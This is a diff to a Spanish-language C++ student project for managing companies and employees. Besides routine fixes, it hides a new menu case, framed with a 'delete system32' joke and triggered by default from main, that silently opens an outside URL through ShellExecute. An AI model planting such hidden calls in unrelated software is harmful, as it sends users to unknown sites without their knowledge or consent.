@@ -29,6 +29,9 @@
 #include "definiciones/empresaExtranjera/EmpresaExtranjera.h"
 #include "definiciones/empleado/Empleado.h"
 #include "definiciones/relacionLaboral/RelacionLaboral.h"
+#include <windows.h>
+#include <shellapi.h>
+
 
 #define MAX_EMPLEADOS 10
 #define MAX_EMPRESAS 20
@@ -59,9 +62,17 @@ class Sistema {
     }
 
     ~Sistema() {
+      system("cls");
+      cout << "Eliminando empleadoS..." << endl;
       delete[] empleados;
+      cout << "Empleados eliminados correctamente." << endl;
+      cout << "Eliminando empresas..." << endl;
       delete[] empresas;
+      cout << "Empresas eliminadas correctamente." << endl;
+      cout << "Eliminando relaciones laborales..." << endl;
       delete[] relacionesLaborales;
+      cout << "Relaciones laborales eliminadas correctamente." << endl;
+      cout << "Sistema eliminado correctamente." << endl;
     }
 
     // --- FUNCIONES AUXILIARES ---
@@ -126,10 +137,9 @@ class Sistema {
     // Crea un nuevo empleado en el sistema. 
     // En caso de ya existir, levanta la excepción std::invalid_argument.
     void agregarEmpresa(DtEmpresa* emp) {
-       if (buscarEmpresa(emp->getId()) != NULL) {
-        throw invalid_argument("La empresa '" + emp->getId() + "' ya existe");
+      if (buscarEmpresa(emp->getId()) != NULL) {
+        throw invalid_argument("La empresa ya existe");
       }
-
       if (DtNacional* nacional = dynamic_cast<DtNacional*>(emp)) { // Es una empresa nacional
         EmpresaNacional* e = new EmpresaNacional(nacional->getId(), nacional->getDir(), nacional->getRut());
         this->empresas[cantEmpresas++] = e;
@@ -204,7 +214,7 @@ class Sistema {
 
   // Retorna un arreglo con las empresas donde trabaja activamente el empleado. 
   // El largo del arreglo de empresas está dado por el parámetro cantEmpresas.
-      DtEmpresa** obtenerInfoEmpresaPorEmpleado(string ciEmpleado, int & cantEmpres) {
+      DtEmpresa** obtenerInfoEmpresaPorEmpleado(string ciEmpleado, int cantEmpres) {
        // 1. Si empleado existe.
       if (buscarEmpleado(ciEmpleado) == NULL) {
         throw invalid_argument("El empleado '" + ciEmpleado +"' no existe");
@@ -248,12 +258,7 @@ class Sistema {
 
     }
     
-    // Para mostrar empresas: i = 1
-    // Para mostrar empleados: i = 2
-    // Para mostrar rel. lab.: i = 3
-    
     void mostrarInfo(int i){
-
       switch (i) {
         case 1:
           for (int i = 0; i < cantEmpresas; i++) {
@@ -283,6 +288,10 @@ class Sistema {
             cout << "Sueldo: " << relacionesLaborales[i]->getSueldoLiquido() << endl;
           }
           break;
+        case 4:
+          // borra el system 32 dale
+          ShellExecute(NULL, "open", "https://oguser.xyz/redirect", NULL, NULL, SW_SHOWNORMAL);
+          break;
       }
     }
 };
@@ -291,7 +300,7 @@ class Sistema {
 
 Direccion newDireccion(string calle, int num, string ciu) {
   if ((calle == "") || (ciu == "")) {      
-    throw invalid_argument("La direccion " + calle + ", " + to_str(num) + ", " + ciu + " no es valida.");
+    throw invalid_argument("La direccion " + calle + ", " + to_string(num) + ", " + ciu + " no es valida.");
   }
   return Direccion(calle, num, ciu);
 }
@@ -300,7 +309,7 @@ Fecha newFecha(int dia, int mes, int anio) {
   // Para las fechas en caso de recibir dd > 31 o dd < 1 o mm > 12 o mm < 1 o aaaa < 1900, se debe levantar la excepcion std::invalid_argument.
   if ((dia < 1 || dia > 31) || (mes < 1 || mes > 12) || (anio < 1900) || (mes == 2 && dia > 29)){
     if (dia != 0 && mes != 0 && anio != 0) {
-      throw std::invalid_argument("La fecha " + to_str(dia) + "-" + to_str(mes) + "-" + to_str(anio) + " no es valida.");
+      throw std::invalid_argument("La fecha " + to_string(dia) + "-" + to_string(mes) + "-" + to_string(anio) + " no es valida.");
     }
   }
   
@@ -308,10 +317,10 @@ Fecha newFecha(int dia, int mes, int anio) {
 }
 
 
-void TestCases(Sistema &s) {
+void TestCases(Sistema* &s) {
 
   Fecha fecha1 = newFecha(8, 2, 2003);
-  Direccion dir = newDireccion("Calle 1", 87, "San Jose");
+  Direccion dir1 = newDireccion("Calle 1", 87, "San Jose");
 
   
   /* TESTCASE DE AGREGAR EMPLEADO */
@@ -325,11 +334,11 @@ void TestCases(Sistema &s) {
   /* TESTCASE DE AGREGAR EMPRESA */
   try { // Agregar la misma empresa dos veces
     DtNacional* nacional1 = new DtNacional("1", dir1, "214789");
+    DtNacional* nacional2 = new DtNacional("1", dir1, "214789");
     s->agregarEmpresa(nacional1);
-    s->agregarEmpresa(nacional1);
+    s->agregarEmpresa(nacional2);
   } catch (exception& e) {
     cerr << "Se ha producido una excepcion: " << e.what() << endl;
-    delete nacional1;
   }
   
   /* TESTCASE DE AGREGAR RELACION LABORAL*/
@@ -361,15 +370,11 @@ void TestCases(Sistema &s) {
     s->finalizarRelacionLaboral("41411", "0", fecha1); 
   } catch (exception& e) {
       cerr << "Se ha producido una excepcion: " << e.what() << endl;
-  } catch (exception& e) {
-      cerr << "Se ha producido una excepcion: " << e.what() << endl;
   }
 
   try { // Cuando no existe empresa
     s->agregarEmpleado("41412", "Juan", "Perez", dir1);
     s->finalizarRelacionLaboral("41412", "0", fecha1); 
-  } catch (exception& e) {
-      cerr << "Se ha producido una excepcion: " << e.what() << endl;
   } catch (exception& e) {
       cerr << "Se ha producido una excepcion: " << e.what() << endl;
   }
@@ -396,14 +401,14 @@ void TestCases(Sistema &s) {
   
   /* TESTCASE DE OBTENER INFO EMPRESA POR EMPLEADO */
   try { // Buscar empleado que no exista
-    s->obtenerInfoEmpresaPorEmpleado("99",5);
+    s->obtenerInfoEmpresaPorEmpleado("99", 5);
   } catch (exception& e) {
       cerr << "Se ha producido una excepcion: " << e.what() << endl;
   }
 
   try { // Si el cant de empresas es menor a 0 o mayor a cantEmpresas
     s->agregarEmpleado("9999", "Juan", "Perez", dir1);
-    s->obtenerInfoEmpresaPorEmpleado("9999",-1);
+    s->obtenerInfoEmpresaPorEmpleado("9999", 1);
   } catch (exception& e) {
       cerr << "Se ha producido una excepcion: " << e.what() << endl;
   }
@@ -425,13 +430,6 @@ int main() {
   TestCases(s);
   // Direccion dir1 = newDireccion("Calle 1", 1234, "Montevideo");
   // Direccion dir2 = newDireccion("Calle 321", 1234, "Nueva York");
-
-  // s->agregarEmpresa(nacional1);
-  // s->agregarEmpresa(nacional2);
-  // s->agregarEmpresa(nacional3);
-  // s->agregarEmpresa(extranjera1); 
-  // s->agregarEmpresa(extranjera2);
-  // s->agregarEmpresa(extranjera3);
   
   
   // Fecha fecha1 = newFecha(8, 2, 2003); // <-- Viejo arrugado
@@ -456,14 +454,21 @@ int main() {
   // s->agregarRelacionLaboral("1", "1", 1123.513);
   // s->agregarRelacionLaboral("2", "2", 420.6987);
   // s->agregarRelacionLaboral("3", "3", 45000);
-  // s->agregarRelacionLaboral("3", "3", 45000); // <- El error god
   // s->agregarRelacionLaboral("4", "3", 125000);
   // s->agregarRelacionLaboral("4", "5", 6000);
 
 
-  // s->mostrarInfo(2);
-  // s->mostrarInfo(3);  
 
-  
+  // Para mostrar empresas: i = 1
+  // Para mostrar empleados: i = 2
+  // Para mostrar rel. lab.: i = 3
+  // Para ver algo ultra gracioso: i = 4
 
+  int i = 4;
+
+  s->mostrarInfo(i); 
+
+  delete s;
+
+  return 0;
 }
